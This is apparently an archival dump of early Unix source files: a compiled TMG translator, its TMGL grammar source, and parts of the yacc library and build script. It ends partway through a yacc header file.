dtt
ifelem
alt;..54
trans;1 .7
goto;..53
..54:trans;1 .10
..53:
..52:
..51:
..50:
..47:
..46:
1 succ
.1=.
1
iseasy:

.l;easy
.l;.1
.st
1 .p
.1=.
0
ishard:

.l;easy
.l;.1
.st
1 .p
.1=.
2
noelem:

.l;easy
.l;.1
.st
1 .p
.1=.
2
ifelem:

.l;easy
.l;.1
.ne
1 .t
.2=.
1
ifeasy:

.l;easy
.l;.2
.eq
1 .t
.2=.
<trans;1 \0>;.even
.1=.
gpar;1
.tq;1
.tx;.2
1 .tp;.byte 1,0;
.4=.
<.px\0>;.even
.3=.
gpar;1
.tq;1
.tx;.4
1 .tp;.byte 1,0;
.6=.
<.pn\0>;.even
.5=.
gpar;1
.tq;1
1 .tx;.6
.10=.
<.t\0>;.even
.7=.
1 .tx;.10
.12=.
<.p\0>;.even
.11=.
1 .tx;.12
.13=.
gpar;1
.tp;.byte 2,0;
.tn
.tq;1
1 .tp;.byte 1,0;
special:

.pxs;'=
alt;..70
rname
salt;..60
remote
trule
..60:
trans;1 .1
goto;..61
..70:.pxs;'<
alt;..67
literal
trans;1 .3
goto;..62
..67:.pxs;'*
alt;..66
trans;1 .5
goto;..63
..66:.pxs;'[
expr
.pxs;'?
alt;..65
trans;1 .7
goto;..64
..65:trans;1 .11
..64:
.pxs;']
trans;1 .13
..63:
..62:
..61:
1 succ
.2=.
<[-\0>;.even
.3=.
<\\<1]\0>;.even
.1=.
.tx;.2
.tp;.byte 1,0;
1 .tx;.3
rname:

name
alt;..72
tabval
pat
npa
alt;done
goto;..71
..72:.pxs;'$
number
..71:
1 trans;1 .1
.2=.
<gpar;\0>;.even
.1=.
.tx;.2
.tp;.byte 2,0;
.tn
1 .tp;.byte 1,0;
trule:

oldtab
ptt
tbody
salt;..73
.pxs;'(
number
salt;..74
tra
..74:
.pxs;')
tbody
trans;1 .1
..73:
1 succ
tra:

list
tident
1 octal
npt
tident:

ident
1 newtab
ptt
npt
.2=.
<1 generate\0>;.even
.1=.
1 .tx;.2
tbody:

.pxs;'{
.pxs;'}
alt;..76
trans;1 .1
goto;..75
..76:trb
..75:
1 succ
.1=.
xbit
1 .tp;.byte 1,0;
.2=.
.tp;.byte 2,0;
.tn
1 .tp;.byte 1,0;
trb:

telem
.pxs;'}
alt;..100
trans;1 .1
goto;..77
..100:trb
trans;1 .2
..77:
1 succ
.2=.
<.tx\0>;.even
.1=.
.tx;.2
1 .tp;.byte 1,0;
.4=.
<.tn\0>;.even
.3=.
1 .tx;.4
.6=.
<.tq;\0>;.even
.5=.
.tx;.6
1 .tp;.byte 1,0;
telem:

.pxs;'<
alt;..110
literal
trans;1 .1
goto;..101
..110:.pxs;'*
alt;..107
trans;1 .3
goto;..102
..107:.pxs;'$
alt;..106
number
trans;1 .5
goto;..103
..106:number
alt;..105
tdot
trans;1 tpt
goto;..104
..105:name
te1
salt;done
te2
salt;done
..104:
..103:
..102:
..101:
1 succ
te1:

tabval
dtt
ndt
tdot
1 trans;1 tpt
.2=.
<.tq;\0>;.even
.1=.
.tx;.2
1 .tp;.byte 1,0;
te2:

tabval
ptt
npt
1 trans;1 .1
.1=.
1 .txs;'0
.2=.
.tp;.byte 2,0;
.txs;';
1 .tp;.byte 1,0;
tdot:

.pxs;'.
alt;..112
number
goto;..111
..112:trans;1 .1
..111:
.pxs;'(
alt;..114
list
targ
.pxs;')
goto;..113
..114:null
..113:
1 trans;1 .2
targ:

name
salt;..115
remote
tbody
..115:
1 succ
.1=.
<.tp;.byte \0>;.even
tpt:
.tx;.1
.tp;.byte 2,0;
.txs;',
1 .tp;.byte 1,0;
.1=.
.txs;';
1 .tp;.byte 1,0;
literal:

shortlit
salt;..116
remote
longlit
trans;1 .1
..116:
1 succ
.1=.
<\>\0>;.even
.3=.
<s;'\0>;.even
.2=.
.tx;.3
1 .tp;.byte 1,0;
shortlit:

ignore
none
smark
any
litch
.px;.1
scopy
1 trans;1 .2
.1=.
<\>\0>;.even
.3=.
<\\\0>;.even
.4=.
<\>\0>;.even
.2=.
.tx;.3
1 .tx;.4
.5=.
<\>\0>;.even
.7=.
<\\0\0>;.even
.10=.
<\>;.even\0>;.even
.6=.
.txs;'<
.tp;.byte 2,0;
.tp;.byte 1,0;
.tx;.7
1 .tx;.10
longlit:

ignore
none
.px;.1
alt;..120
trans;1 .2
goto;..117
..120:null
..117:
litb
.px;.5
1 trans;1 .6
.1=.
<\\\0>;.even
.3=.
<\\\\\0>;.even
.2=.
.tp;.byte 2,0;
.tx;.3
1 .tp;.byte 1,0;
litb:

smark
string
litch
scopy
.px;.1
alt;done
litb
1 trans;1 .2
expr:

assignment
salt;..121
rv
..121:
1 succ
.1=.
.tp;.byte 3,0;
.tn
.tp;.byte 1,0;
.tn
1 .tp;.byte 2,0;
assignment:

lv
assign
expr
1 trans;1 .1
.1=.
.tp;.byte 3,0;
.tn
.tp;.byte 1,0;
.tn
1 .tp;.byte 2,0;
.2=.
.tp;.byte 2,0;
.tn
1 .tp;.byte 1,0;
rv:

prime
rv1:
bundle
infix
alt;..125
prime
trans;1 .1
salt;rv1
goto;..122
..125:rva
alt;..124
trans;1 .2
goto;..123
..124:
..123:
..122:
1 succ
.2=.
<.t;alt;\0>;.even
.3=.
<salt;\0>;.even
.1=.
.tx;.2
.tp;.byte 2,0;
.tn
.tp;.byte 4,0;
.tn
.tx;.3
.tp;.byte 1,0;
.tn
.tp;.byte 2,0;
.txs;':
.tp;.byte 3,0;
.tn
.tp;.byte 1,0;
1 .txs;':
rva:

.pxs;'?
rv
.pxs;':
rv
fref
fref
1 trans;1 .1
.1=.
.tp;.byte 2,0;
.tn
1 .tp;.byte 1,0;
.2=.
.tp;.byte 1,0;
.tn
1 .tp;.byte 2,0;
.3=.
.tp;.byte 1,0;
.tn
1 .tp;.byte 2,0;
.5=.
<.l;\0>;.even
.4=.
.tx;.5
1 .tp;.byte 1,0;
prime:

lv
alt;..135
suffix
alt;done
trans;1 .1
goto;..126
..135:prefix
alt;..134
lv
trans;1 .2
goto;..127
..134:.pxs;'(
alt;..133
expr
.pxs;')
goto;..130
..133:unary
alt;..132
prime
trans;1 .3
goto;..131
..132:remote
number
trans;1 .4
..131:
..130:
..127:
..126:
1 succ
.2=.
<.l;\0>;.even
.1=.
.tx;.2
1 .tp;.byte 1,0;
.4=.
<.rv\0>;.even
.3=.
.tp;.byte 1,0;
.tn
1 .tx;.4
.6=.
<.f\0>;.even
.5=.
.tp;.byte 2,0;
.tn
.tp;.byte 1,0;
.tn
1 .tx;.6
lv:

rname
alt;..141
trans;1 .1
goto;..136
..141:.pxs;'(
alt;..140
lv
.pxs;')
goto;..137
..140:.pxs;'*
prime
trans;1 .3
..137:
..136:
lv1:
.pxs;'[
alt;done
bundle
expr
.pxs;']
trans;1 .5
1 salt;lv1
.2=.
<.u\0>;.even
.1=.
.tp;.byte 1,0;
.tn
1 .tx;.2
.4=.
<.st\0>;.even
.3=.
1 .tx;.4
assign:

.pxs;'=
ignore
none
infix
alt;..143
trans;1 .1
goto;..142
..143:trans;1 .3
..142:
1 succ
.2=.
1 .pxs;'+
.1=.
.pxs;'+
1 not
.2
.4=.
<.a\0>;.even
.3=.
1 .tx;.4
.6=.
<.s\0>;.even
.5=.
1 .tx;.6
.10=.
<.m\0>;.even
.7=.
1 .tx;.10
.12=.
<.q\0>;.even
.11=.
1 .tx;.12
.14=.
<.r\0>;.even
.13=.
1 .tx;.14
.16=.
<.o\0>;.even
.15=.
1 .tx;.16
.20=.
<.x\0>;.even
.17=.
1 .tx;.20
.22=.
<.n\0>;.even
.21=.
1 .tx;.22
.23=.
<==\0>;.even
.25=.
<.eq\0>;.even
.24=.
1 .tx;.25
.26=.
<!=\0>;.even
.30=.
<.ne\0>;.even
.27=.
1 .tx;.30
.31=.
<<=\0>;.even
.33=.
<.le\0>;.even
.32=.
1 .tx;.33
.34=.
<\>=\0>;.even
.36=.
<.ge\0>;.even
.35=.
1 .tx;.36
.37=.
<<<\0>;.even
.41=.
<.sl\0>;.even
.40=.
1 .tx;.41
.43=.
<.lt\0>;.even
.42=.
1 .tx;.43
.44=.
<\>\0>;.even
.45=.
<\>\0>;.even
.47=.
<.sr\0>;.even
.46=.
1 .tx;.47
.51=.
<.gt\0>;.even
.50=.
1 .tx;.51
infix:

smark
ignore
none
.pxs;'+
alt;..201
not
.1
trans;1 .3
goto;..144
..201:.pxs;'-
alt;..200
trans;1 .5
goto;..145
..200:.pxs;'*
alt;..177
trans;1 .7
goto;..146
..177:.pxs;'/
alt;..176
trans;1 .11
goto;..147
..176:.pxs;'%
alt;..175
trans;1 .13
goto;..150
..175:.pxs;'|
alt;..174
trans;1 .15
goto;..151
..174:.pxs;'^
alt;..173
trans;1 .17
goto;..152
..173:.pxs;'&
alt;..172
trans;1 .21
goto;..153
..172:.px;.23
alt;..171
trans;1 .24
goto;..154
..171:.px;.26
alt;..170
trans;1 .27
goto;..155
..170:.px;.31
alt;..167
trans;1 .32
goto;..156
..167:.px;.34
alt;..166
trans;1 .35
goto;..157
..166:.px;.37
alt;..165
trans;1 .40
goto;..160
..165:.pxs;'<
alt;..164
trans;1 .42
goto;..161
..164:.px;.44
.px;.45
alt;..163
trans;1 .46
goto;..162
..163:trans;1 .50
..162:
..161:
..160:
..157:
..156:
..155:
..154:
..153:
..152:
..151:
..150:
..147:
..146:
..145:
..144:
1 succ
.2=.
<.lv\0>;.even
.1=.
1 .tx;.2
.3=.
<++\0>;.even
.5=.
<.ib\0>;.even
.4=.
1 .tx;.5
.6=.
<--\0>;.even
.10=.
<.db\0>;.even
.7=.
1 .tx;.10
prefix:

smark
ignore
none
.pxs;'&
alt;..205
trans;1 .1
goto;..202
..205:.px;.3
alt;..204
trans;1 .4
goto;..203
..204:.px;.6
trans;1 .7
..203:
..202:
1 succ
.1=.
<++\0>;.even
.3=.
<.ia\0>;.even
.2=.
1 .tx;.3
.4=.
<--\0>;.even
.6=.
<.da\0>;.even
.5=.
1 .tx;.6
suffix:

smark
ignore
none
.px;.1
alt;..207
trans;1 .2
goto;..206
..207:.px;.4
trans;1 .5
..206:
1 succ
.2=.
<.nt\0>;.even
.1=.
1 .tx;.2
.4=.
<.ng\0>;.even
.3=.
1 .tx;.4
.6=.
<.cm\0>;.even
.5=.
1 .tx;.6
unary:

.pxs;'!
alt;..213
trans;1 .1
goto;..210
..213:.pxs;'-
alt;..212
trans;1 .3
goto;..211
..212:.pxs;'~
trans;1 .5
..211:
..210:
1 succ
charcl:

.pxs;'!
alt;..215
ccla
cclb
goto;..214
..215:ccla
..214:
1 octal
classmask
.1=.
<<<\0>;.even
.2=.
1
.4=.
<<<\0>;.even
ccla:

.px;.1
.l;classmask
.l;.2
.l;nclass
.ia
.sl
.st
.p
.l;classmask
.t
alt;cherr
ccl1:
cclc
.px;.4
1 salt;ccl1
.1=.
<\>\0>;.even
cclc:

ignore
none
ccl3:
.px;.1
salt;ccl4
ccle
1 salt;ccl3
.1=.
<\>\0>;.even
.3=.
<\>\0>;.even
.2=.
1 .px;.3
ccl4:

.px;.1
salt;..216
cclx
fail
..216:
not
.2
salt;..217
ccle
..217:
1 succ
.1=.
2
ccle:

char
n
.l;.1
.l;n
.m
.l;classes
.lv
.a
.rv
.l;classmask
.o
.u
1 .p
cclb:

zeron
ccl5:
.l;classes
.lv
.l;n
.a
.rv
.l;classmask
.x
.u
.p
testn
1 salt;ccl5
cclx:

.l;nclass
.da
.p
zeron
ccl6:
.l;classes
.lv
.l;n
.a
.rv
.l;classmask
.cm
.n
.u
.p
testn
1 salt;ccl6
.3=.
<too many char classes\0>;.even
.2=.
1 .tx;.3
.1=.
1 trans;1 .2
cherr:

1 diag
.1
.1=.
0
zeron:

.l;n
.l;.1
.st
1 .p
.1=.
2
.2=.
400
testn:

.l;n
.l;.1
.a
.u
.l;.2
.lt
1 .t
.1=.
0
.4=.
<.globl classtab\0>;.even
.5=.
<classtab:\0>;.even
.3=.
.tn
.tx;.4
.tn
.tx;.5
1 .tn
.2=.
1 trans;1 .3
.7=.
.tp;.byte 1,0;
1 .tn
.6=.
octal
w
1 trans;1 .7
putcharcl:

zeron
.l;classes
.l;.1
.st
.p
parse
.2
ptc1:
.l;w
.l;classes
.lv
.l;n
.a
.rv
.st
.p
parse
.6
bundle
testn
1 salt;ptc1
classmask:
0
nclass:
0
classes:
cl1:
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
cl2:
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
cl3:
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
cl4:
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
cl5:
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
cl6:
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
cl7:
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
cl8:
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
done:

1 succ
.1=.
.txs;'.
1 .tp;.byte 1,0;
create:

.l;csym
.ia
.p
getcsym:
octal
csym
1 trans;1 .1
.2=.
<..\0>;.even
.1=.
.tx;.2
1 .tp;.byte 1,0;
fref:

.l;fsym
.ia
.p
getfref:
octal
fsym
1 trans;1 .1
.1=.
1
not:

params
.1
[-1\<1]
alt;done
1 fail
.1=.
1
.2=.
.tp;.byte 2,0;
.tn
1 .tp;.byte 1,0;
list:

params
.1
[-1\<1]
list1:
bundle
.pxs;',
alt;done
[-1\<1]
trans;1 .2
1 salt;list1
.1=.
1
remote:

params
.1
create
1 parse
rem1
[-1\<1]
.1=.
1
.3=.
<=.\0>;.even
.2=.
.tp;.byte 2,0;
.tx;.3
.tn
.tp;.byte 1,0;
1 .tn
rem1:

params
.1
getcsym
[-1\<1]
1 trans;1 .2
number:

smark
ignore
none
any
digit
string
digit
1 scopy
name:

ident
1 scopy
ident:

smark
ignore
none
any
letter
1 string
alpha
.1=.
1
.3=.
0
oldtab:

params
.1
.l;[-1\<1]
.t
alt;done
discard
[-1\<1]
.l;[-1\<1]
.l;.3
.st
1 .p
.1=.
2
.3=.
0
newtab:

params
.1
.l;[-2\<1]
.t
salt;..220
table
[-2\<1]
.l;[-1\<1]
.l;.3
.st
.p
..220:
enter
[-2\<1]
i
.l;[-2\<1]
.l;i
.f
.l;[-1\<1]
.ia
.st
1 .p
.1=.
2
tabval:

params
.1
.l;[-2\<1]
.t
find
[-2\<1]
i
.l;i
.l;[-1\<1]
.l;[-2\<1]
.l;i
.f
.s
.st
.p
1 octal
i
null:

1 trans;1 nil
.1=.
<1 \0>;.even
xbit:
1 .tx;.1
q1:
1 .tq;1
q2:
1 .tq;2
nil:
1 generate
blanks:
10
digit:
20
letter:
40
alpha:
100
litch:
200
none:
400
csym:
0
fsym:
0
easy:
0
w:
0
n:
0
dtt:
0
ndt:
0
sndt:
0
pat:
0
npa:
0
ptt:
0
npt:
0
i:
0

.globl classtab
classtab:
0
207
207
207
207
207
207
207
207
217
217
207
207
207
207
207
207
207
207
207
207
207
207
207
207
207
207
207
207
207
207
207
217
207
207
207
207
207
207
207
207
207
203
207
207
207
207
207
327
327
327
327
327
327
327
327
327
327
207
205
207
207
7
207
207
347
347
347
347
347
347
347
347
347
347
347
347
347
347
347
347
347
347
347
347
347
347
347
347
347
347
207
7
207
207
207
207
347
347
347
347
347
347
347
347
347
347
347
347
347
347
347
347
347
347
347
347
347
347
347
347
347
347
207
207
207
207
207
.pn:1 .pxs;12
.tn:1 .txs;12
-- /usr/source/tmg/tmgl.t mode=0110664 uid=3 gid=3 atime=174924584 mtime=169260948 --
begin:	ignore(blanks)
pr1:	comment\pr1
	parse(first)\pr2
	diag(error)
pr2:	comment\pr2
	parse(line)\pr2
	diag(error)\pr2
	putcharcl
	parse(last);

first:	parse(( fref = {<1 > 1 *}))
	getfref line = { 2<:> 1 };

error:	smark ignore(none) any(!<<>>) string(!<<;>>) scopy 
	( <;> = {<;>} | null )
	= { * <??? > 2 1 * };

line:
	labels
	( charcl <;>
	| statement
	| numbers
	| trule <;> )
	= { 2 * 1 * };

numbers: number <;> numbers/done = { 2 * 1 };

labels:	label labels/done = { 2 * 1 };

label:	name <:> = { 1 <:> };

last:	= {	<.pn:1 .pxs;12> *
		<.tn:1 .txs;12> * };

comment: </*>
co1:	ignore(!<<*>>) <*> ignore(none) </>/co1;

statement: [csym=0] oldtab(dtt) oldtab(pat)
	( proc plst tlst <)> = (1){2 1 }
	| = (1){} noelem )
stt1:	bundle	( frag = (1){ 2(nil) * 1(q1) }\stt1
		| <;>	( ifelem = { 1(xbit) }
			| ={ 1(nil) * <1 succ> }
		)	);

proc:	smark ignore(none) <proc(>;

plst:	list(pident)/null remote((octal(npa)))
	= { <params;> 1 * };

pident:	ident newtab(pat,npa);

tlst:	<;>/null [i=0] list((name [i++])) remote((octal(i)))
	= { <push;> 1 * 2 * };

frag:	prule = (1){ 1(nil,q1) }
	| labels noelem = (1){ 1 };

/*in sequel q2 is where to go on fail,q1 is exit bit*/

prule:	[sndt=ndt] disj
	( <|> [ndt=sndt] fref
		( ifeasy prule = (2){3(nil,nil)*<salt;>2*
				1(q2,q1)*2<:>}
		| prule fref = (2){4({*<alt;>1},q1)*<goto;>3*
				1<:>2(q2,q1)*3<:>} )
		noelem
	| () );

disj:	pelem pdot
	( disj = (2){2(q2,nil) * 1(nil,q1)} ifelem/done ishard
	| () );

pelem:	pprim = (2){1(q1)$2} iseasy
	| <(>	push(1,sndt)
		( prule <)>
		| <)> = (2){} noelem );

pprim:	( special
	| rname	( <:> fail
		| (spdot|()) ignore(none)
			( <(> ignore(blanks) list(parg) <)>
				= (1){$1 2 * 1}
			| = (1){$1 1}  )))
	( (</> = {<alt;>} | <\>={<salt;>})
		rname = (1){3(nil)*$1 2 1}
	| () );

pdot:	<.>/done ignore(none) ident\alias
	([dtt?] | table(dtt) [ndt=0]) [ndt++];
spdot:	<.> ignore(none) not(( any(letter) ))
alias:	newtab(dtt,ndt);

parg:	rname | remote(specparg);

specparg: number
	| charcl
	| <<> longlit
	| <*> = { <\n\0> }
	| <(> ( <)> = {<1 succ>}
		| push(3,dtt,ndt,sndt) [dtt=0]
			prule <)> oldtab(dtt)
			( ifelem = {1(nil,xbit) }
			| = {1(nil,nil)*<1 succ>} 
		)	);

iseasy:	[easy = 1];
ishard:	[easy = 0];
noelem:	[easy = 2];
ifelem:	[easy!=2?];
ifeasy:	[easy==1?];

special: <=> (rname | remote(trule))
		= (1){ $1 <trans;1 > 1 }
	| <<> literal = (1){ $1 <.px> 1 }
	| <*> = (1){ $1 <.pn> }
	| <[> expr
		( <?> = {<.t>}
		| = {<.p>} )
		<]> = (1){ 2 * $1 1 };

rname:	( name tabval(pat,npa)/done
	| <$> number )
	= { <[-> 1 <\<1]> };

trule:	oldtab(ptt)
	( tbody
	| <(> (number|tra) <)> tbody = {<gpar;> 2 * 1 } );
tra:	list(tident) octal(npt);

tident:	ident newtab(ptt,npt);

tbody: <{>	( <}> = { <1 generate> }
		| trb);
trb:	telem	( <}> = {  xbit 1 }
		| trb = { 2 * 1 } );

telem:	<<> literal = { <.tx> 1 }
	| <*> = {<.tn>}
	| <$> number = { <.tq;> 1 }
	| number tdot = tpt
	| name te1\done te2\done;

te1:	tabval(dtt,ndt) tdot = tpt;
te2:	tabval(ptt,npt) = {<.tq;>1};

tdot:	(<.> number | ={<0>})
	( <(> list(targ) <)> | null)
	= { 2 <;> 1 };

targ:	name|remote(tbody);

tpt:	{ <.tp;.byte > 2 <,> 1 };

literal: ( shortlit
	| remote(longlit) = { <;> 1} );

shortlit: ignore(none) smark any(litch) <>> scopy = { <s;'> 1 };

longlit: ignore(none) (<>> = { <\> <>> } | null) litb <>>
	= { <<> 2 1 <\0> <>;.even> };

litb:	smark string(litch) scopy <\>/done
	litb = { 2 <\\> 1 };

expr:	assignment | rv ;

assignment: lv assign expr = { 3 * 1 * 2 };

rv:	prime
rv1:	bundle	( infix prime = { 3 * 1 * 2 }\rv1
		| rva = { 2 * 1 }
		| () );
rva:	<?> rv <:> rv fref fref 
	= { <.t;alt;> 2 * 4 * <salt;> 1 * 2 <:> 3 * 1 <:> };

prime:
	lv suffix/done = { 2 * 1 }
	| prefix lv = { 1 * 2 }
	| <(> expr <)> 
	| unary prime = { 1 * 2 }
	| remote(number) = { <.l;> 1 };

lv:	( rname = { <.l;> 1 }
	| <(> lv <)>
	| <*> prime = { 1 * <.rv> } )
lv1:	<[>/done bundle expr <]> = { 2 * 1 * <.f> }\lv1;

assign:	<=> ignore(none) ( infix = { 1 * <.u> }
			| = { <.st> } );

infix:	smark ignore(none)
	( <+> not((<+> not((<+>)) )) = {<.a>}
	| <-> = {<.s>}
	| <*> = {<.m>}
	| </> = {<.q>}
	| <%> = {<.r>}
	| <|> = {<.o>}
	| <^> = {<.x>}
	| <&> = {<.n>}
	| <==> = {<.eq>}
	| <!=> = {<.ne>}
	| <<=> = {<.le>}
	| <>=> = {<.ge>}
	| <<<> = {<.sl>}
	| <<> = {<.lt>}
	| <>>	(  <>> = {<.sr>}
		| = {<.gt>} )
	);

prefix:	smark ignore(none)
	( <&> = {<.lv>}
	| <++> = {<.ib>}
	| <--> = {<.db>}
	);

suffix:	smark ignore(none)
	( <++> = {<.ia>}
	| <--> = {<.da>}
	);

unary:	( <!> = {<.nt>}
	| <-> = {<.ng>}
	| <~> = {<.cm>}
	);

charcl:
	( <!> ccla cclb | ccla )
	octal(classmask);
ccla:	(<<<>) [classmask = 1<<nclass++] [classmask?]/cherr
ccl1:	cclc <<<>\ccl1;
cclc:	ignore(none)

ccl3:	<>>\ccl4 ccle\ccl3;
ccl4:	(<>> | cclx fail) (not((<>>)) | ccle);
ccle:	char(n) [*(2*n+&classes) =| classmask];
cclb:	zeron
ccl5:	[*(&classes+n) =^ classmask] testn\ccl5;
cclx:	[nclass--] zeron
ccl6:	[*(&classes+n) =& ~classmask] testn\ccl6;
cherr:	diag(( ={<too many char classes>} ));

zeron:	[n=0];
testn:	[(n=+2)<400?];

putcharcl: zeron [classes=0] 
	parse(( = { * <.globl classtab> * <classtab:> * } ))
ptc1:	[w = *(&classes+n)] parse((octal(w) = {1*}))
	bundle testn\ptc1;

classmask: 0;
nclass:	0;
classes:
cl1:	0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;
cl2:	0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;
cl3:	0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;
cl4:	0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;
cl5:	0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;
cl6:	0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;
cl7:	0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;
cl8:	0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;

done:	;

create:	[csym++]
getcsym: octal(csym) = {<.> 1};

fref:	[fsym++]
getfref: octal(fsym) = { <..> 1 };

not:	params(1) $1/done fail;

list:	params(1) $1
list1:	bundle <,>/done $1 = { 2 * 1 }\list1;

remote:	params(1) create parse(rem1,$1);
rem1:	params(1) getcsym $1 = { 2 <=.> * 1 * };

number: smark ignore(none) any(digit) string(digit) scopy;

name:	ident scopy;

ident:	smark ignore(none) any(letter) string(alpha);

oldtab:	params(1) [$1?]/done discard($1) [$1=0];

newtab:	params(2) ([$2?] | table($2) [$1=0])
	enter($2,i) [$2[i] = $1++];

tabval:	params(2) [$2?] find($2,i) [i=$1-$2[i]] octal(i);

null:	= nil;

xbit:	{<1 >};

q1:	{ $1 };
q2:	{ $2 };

nil:	{};

blanks:	<< 	
	>>;
digit:	<<0123456789>>;
letter:	<<abcdefghijklmnopqrstuvwxyz>>
	<<ABCDEFGHIJKLMNOPQRSTUVWXYZ>>;
alpha:	<<0123456789>>
	<<abcdefghijklmnopqrstuvwxyz>>
	<<ABCDEFGHIJKLMNOPQRSTUVWXYZ>>;
litch:	!<<\>>>;
none:	<<>>;

csym:	0;
fsym:	0;
easy:	0;
w:	0;
n:	0;
dtt:	0;	/*delivered translation table*/
ndt:	0;	/*numb of delivered translations*/
sndt:	0;	/*saved ndt at beginning of disjunctive term*/
pat:	0;	/*parsing rule parameter table*/
npa:	0;	/*number of parsing rule params*/
ptt:	0;	/*table of params of translation*/
npt:	0;	/*number of params of translation*/
i:	0;
-- /usr/source/yacc mode=0140775 uid=3 gid=3 atime=174930097 mtime=169259861 --
-- /usr/source/yacc/lib mode=0140775 uid=3 gid=3 atime=174930097 mtime=174924617 --
-- /usr/source/yacc/lib/main.c mode=0100664 uid=3 gid=3 atime=174924591 mtime=169260984 --
main( argc, argv ) int argc; char *argv[]; {
  yyinit( argc, argv );
  if( yyparse() ) return;
  yyaccpt();
  }
-- /usr/source/yacc/lib/parser.c mode=0100664 uid=3 gid=3 atime=174924595 mtime=169260984 --
# define _maxdepth 150

/*	parser for yacc output	*/
extern int yyval; /* defined in the table file */
extern int yylval; /* defined in the table file */
extern int *yypv; /* defined in the table file */


int yydebug 0; /* 1 for debugging */
int yyv[_maxdepth]; /* where the values are stored */
int yystate 0; /* current parser state */
int yychar -1; /* current input token number */
int yynerrs 0;  /* number of errors */
int yyerrflag 0;  /* error recovery flag */


yyparse() {

   extern int yygo[], yypgo[], yyr1[], yyr2[], yyact[], yypact[];
   auto int *ps, s[_maxdepth];
   auto int ac, n, *p;

   yystate = 0;
   yychar = -1;
   yynerrs = 0;
   yyerrflag = 0;
   ps= &s[0]-1;
   yypv= &yyv[0]-1;

 stack:    /* put a state and value onto the stack */

   if( yydebug  ) printf( "state %d, value %d, char %d\n",yystate,yyval,yychar );
   *++ps = yystate;
   *++yypv = yyval;

 newstate:      /* set ap to point to the parsing actions for the new state */

   p = &yyact[ yypact[yystate+1] ]; 

 actn:       /* get the next action, and perform it */

   n = ( ac = *p++ ) & 07777;  /* n is the "address" of the action */

   switch( ac>>12 ) { /* switch on operation */

   case 1:		/* skip on test */
      if( yydebug && (yychar<0) ){
        yychar = yylex();
        printf( "character %d read\n", yychar );
        }
      if( n != ( (yychar<0) ? ( yychar=yylex() ) : yychar ) ) ++p;
      goto actn;  /* get next action */

   case 2:		/* shift */

      yystate=n;
      yyval=yylval;
      yychar= -1;
      if( yyerrflag ) --yyerrflag;
      goto stack;   /* stack new state */

   case 3:		/* reduce */

      if( yydebug ) printf("reduce %d\n",n);
      ps =- yyr2[n];
      yypv =- yyr2[n];
      yyval=yypv[1];
      yyactr(n);
         /* consult goto table to find next state */
      for( p= &yygo[yypgo[yyr1[n]]]; *p != *ps && *p >= 0 ; p =+ 2 ) ;
      yystate = p[1];
      goto stack;  /* stack new state and value */

   case 4:		/* accept */
      return(0);

   case 0:   /* error ... attempt to resume parsing */

      switch( yyerrflag ){

      case 0:   /* brand new error */

         ++yynerrs;
         yyerror( "syntax error" );

      case 1:
      case 2: /* incompletely recovered error ... try again */

         yyerrflag = 3;

         /* find a state where "error" is a legal shift action */

         while ( ps >= s ) {
            for( p= &yyact[ yypact[*ps+1] ] ; (*p>>12) == 1 ; p =+ 2 ) /* search ps actions */
                if( *p == 4352 ) goto found;

            /* the current ps has no shift onn "error", pop stack */

            if( yydebug ) printf( "error recovery pops state %d, uncovers %d\n", *ps, ps[-1] );
            --ps;
            --yypv;
            }

         /* there is no state on the stack with an error shift ... abort */

    abort:
         return(1);

      found:   /* we have a state with a shift on "error", resume parsing */

         yystate = p[1] & 07777;
         goto stack;

      case 3:  /* no shift yet; clobber input char */

         if( yydebug ) printf( "error recovery discards char %d\n", yychar );

         if( yychar == 0 ) goto abort; /* don't discard EOF, quit */
         yychar = -1;
         goto newstate;   /* try again in the same state */

         }

      }
   }
-- /usr/source/yacc/lib/zacc.c mode=0100664 uid=3 gid=3 atime=174924603 mtime=169260984 --
yyaccpt(){}
-- /usr/source/yacc/lib/zerr.c mode=0100664 uid=3 gid=3 atime=174924607 mtime=169260984 --
extern int yyline;  /* input line number */

yyerror(s) char *s; {
  extern int yychar;
  extern char *yysterm[];
  printf("\n%s", s );
  if( yyline ) printf(", line %d,", yyline );
  printf(" on input: ");
  if( yychar >= 0400 ) printf("%s\n", yysterm[yychar-0400] );
  else switch ( yychar ) {
    case '\t': printf( "\\t\n" ); return;
    case '\n': printf( "\\n\n" ); return;
    case '\0': printf( "$end\n" ); return;
    default: printf( "%c\n" , yychar ); return;
    }
  }
-- /usr/source/yacc/lib/zinit.c mode=0100664 uid=3 gid=3 atime=174924612 mtime=169260984 --
yyinit(){}
-- /usr/source/yacc/run mode=0100664 uid=3 gid=3 atime=174924724 mtime=174917300 --
chdir lib
cc -c -O *.c
ar r /lib/liby.a *.o
rm *.o
chdir ../source
cc -s -O y?.c
cmp a.out /usr/bin/yacc
cp a.out /usr/bin/yacc
rm a.out *.o
-- /usr/source/yacc/source mode=0140775 uid=3 gid=3 atime=174930097 mtime=174924724 --
-- /usr/source/yacc/source/dextern mode=0110664 uid=3 gid=3 atime=174924688 mtime=169260992 --
#
/*  MANIFEST CONSTANT DEFINITIONS */

# define NTBASE 010000

  /* internal codes for error and accept actions */

# define ERRCODE  8190
# define ACCEPTCODE 8191

# define errfileno 1      /* file number for erros and reduction message */
# define _tbitset 6  /* 16*_tbitset - 1 >= _nterms */

extern int tbitset;  /* number of wds of lookahead vector */
extern int nolook;  /* flag to turn off lookahed computations */
struct looksets { int lset[ _tbitset ]; } ;
struct item { int *pitem; struct looksets *look; } ;

  /* output actions */

# define ERRACT 0
# define TESTACT 4096
# define SHIFTACT 8192
# define REDUCACT 12288
# define ACCEPTACT 16384

# define _REGISTER register

extern int nstate ;		/* number of states */
extern struct item *pstate[];	/* pointers to the descriptions of the states */
